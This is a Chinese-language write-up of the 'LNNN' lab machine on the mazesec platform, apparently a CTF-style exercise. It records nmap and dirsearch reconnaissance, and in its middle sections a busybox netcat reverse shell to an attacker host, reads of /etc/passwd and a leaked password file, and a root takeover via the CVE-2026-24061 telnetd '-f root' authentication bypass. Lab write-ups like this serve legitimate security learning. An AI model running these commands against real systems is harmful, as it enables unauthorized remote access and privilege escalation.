---
title: "LNNN 复盘"
date: 2026-05-23T06:16:57+08:00
draft: false
description: "mazesec 靶机 LNNN 复盘 的渗透测试与提权记录"
categories: ["靶机复盘"]
tags: ["mazesec", "Easy"]
---
| 作者     | 难度                 | 平台    |
| -------- | -------------------- | ------- |
| ll104567 | easy(根据我自己定的) | mazesec |

## 信息收集

```sh
root@kali:~# nmap 192.168.56.118             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-21 23:53 -0400
Nmap scan report for 192.168.56.118
Host is up (0.00090s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin
MAC Address: 08:00:27:35:52:5B (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds
root@kali:~# nmap 192.168.56.118 -p22,80,9090 -A
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-21 23:53 -0400
Nmap scan report for 192.168.56.118
Host is up (0.0021s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 10.0p2 Debian 7+deb13u1 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.66 ((Debian))
|_http-title: Warning
|_http-server-header: Apache/2.4.66 (Debian)
9090/tcp open  ssl/http Cockpit web service
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=LNNN/organizationName=c2d6d1b6c1084753b022ca80771b162d
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2026-05-16T12:12:36
|_Not valid after:  2027-06-15T12:12:36
| http-robots.txt: 1 disallowed entry 
|_/
# 省略了一些无用信息
MAC Address: 08:00:27:35:52:5B (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Google Chromecast with Google TV (Android 10, Linux 4.9) (93%), Android 5 - 10 (Linux 3.4 - 3.18) (93%), Linux 2.6.32 (93%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Linux 5.10 - 5.19 (93%), Linux 3.2 - 4.14 (93%), Linux 5.4 - 5.10 (93%), OpenWrt 21.02 (Linux 5.4) (93%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   2.14 ms 192.168.56.118

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.08 seconds
```

搜索`Cockpit web service`的内容：`基于 Web 的交互式管理界面`，核心功能：

1. **Web 终端访问**：在浏览器中直接获得一个命令行终端，方便执行各种命令
2. **系统状态监控**：通过仪表盘实时查看 CPU、内存、磁盘和网络流量的使用情况
3. **服务与容器管理**：可以方便地管理系统服务（systemd），并监控 Docker 等容器的运行状态
4. **用户与存储管理**：提供图形化界面来创建、管理系统用户，以及查看和管理磁盘分区与存储。

当时目标就放在这个端口，搜索了公开漏洞发现：

![image-20260522204203273](image-20260522204203273.png)

发现了一个比较新的漏洞，不过ssh版本不允许，无法利用，当时还爆破了Cockpit的root密码 (`Cockpit 登录账户直接使用服务器操作系统本身的用户账户`)，并没有爆破出来。

```sh
root@kali:~# dirsearch -u http://192.168.56.118/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.56.118/__26-05-22_00-07-20.txt

Target: http://192.168.56.118/

[00:08:29] 301 -  356B  - /tools  ->  http://192.168.56.118/tools/
[00:08:29] 200 -  897B  - /tools/

Task Completed
```

`http://192.168.56.118/tools/`存放了一些群主发的工具。

重心又放到了`9090`端口，实在看不出来，又返回到`http://192.168.56.118/tools/`，最后发现群主发的工具里啥时候多了一个`shell.php`，这个老六，立足点找到了。

## 初始入侵获取立足点

```sh
busybox nc 192.168.56.101 39666 -e /bin/bash
# kali
nc -lvnp 39666
# 先监听再反向shell
# 优化为交互式shell
```

## 系统内部信息收集

哈哈哈，我今天被我整笑了，`linpeas.sh` 进行系统的信息枚举，但是不会看`linpeas.sh`的返回内容，又不想让`ai`给我分析，导致关键信息没有看出来，不过我还是学习到一些命令。

``` sh
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
lnnn:x:1000:1000:,,,:/home/lnnn:/bin/bash
mono:x:1001:1001:,,,:/home/mono:/bin/bash
todd:x:1002:1002:,,,:/home/todd:/bin/bash

find / -user lnnn 2>/dev/null | grep -v proc
# 发现：
/var/backups/lnnn-password.txt

cat /var/backups/lnnn-password.txt         
c7L0rEw7ay3dQrip5yDU

su lnnn
Password: 

 id
uid=1000(lnnn) gid=1000(lnnn) groups=1000(lnnn),100(users)
# 我就做到这里，还是经历了一些曲折的。
# 运行 lin2026.sh
bash lin2026.sh

Xinetd Configuration (/etc/xinetd.conf):
defaults
{
}
includedir /etc/xinetd.d

Included Configurations:
includedir /etc/xinetd.d

Service Configurations:
Services in /etc/xinetd.d/:

Service: telnet-vuln
Status: Disabled
service telnet-vuln
{
    socket_type     = stream
    wait            = no
    user            = root
    server          = /opt/telnetd
    server_args     = -l
    log_on_failure += USERID
    port            = 2323
}
Warning: Service runs as root

ps auxww | grep "telnetd"
root         544  0.0  0.2  11720  4488 ?        Ss   May21   0:00 /usr/bin/socat TCP-LISTEN:23,bind=127.0.0.1,fork,reuseaddr EXEC:/usr/bin/telnetd,nofork
lnnn      327670  0.0  0.1   6528  2352 pts/2    S+   09:34   0:00 grep telnet

# ww 为了让 cmd 输出更加完整
# 在本地为 telnetd 搭建了一个 入口
telnetd --version
telnetd (GNU inetutils) 2.4
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by many authors.
```

搜索 `2.4` 版本的 公开漏洞 发现：`CVE-2026-24061`，影响范围：`1.9.3 到 2.7`。

## 权限提升

`CVE-2026-24061`

**描述：**
GNU InetUtils 在 2.7-2 之前的 telnetd 实现存在一个可通过环境变量注入实现的认证绕过漏洞。攻击者可以在 Telnet 的 NEW-ENVIRON 子协商过程中传入伪造的 USER 环境变量，例如 "-f root"，从而诱使登录进程直接授予一个 root shell，而无需密码。

**技术分析：**
这个漏洞的根因是：`telnetd` 在把 USER 变量作为参数传递给 /bin/login 之前，没有对其进行安全过滤。
如果攻击者把 -f 标志前置进去，login 程序就会跳过身份认证阶段。

```sh
lnnn@LNNN:~$ telnet -l '-f root' 127.0.0.1 23
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 7.0.8-1-liquorix-amd64 (LNNN) (pts/3)

root@LNNN:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 总结

这次就不做攻击链的总结了，哈哈哈，好像也没有什么好笑的。这次主要卡在系统内部信息收集阶段，对于内网的信息收集不行，我看了`redis`的公开漏洞，打了后无法打通，最后打的心气都没了，哈哈哈。
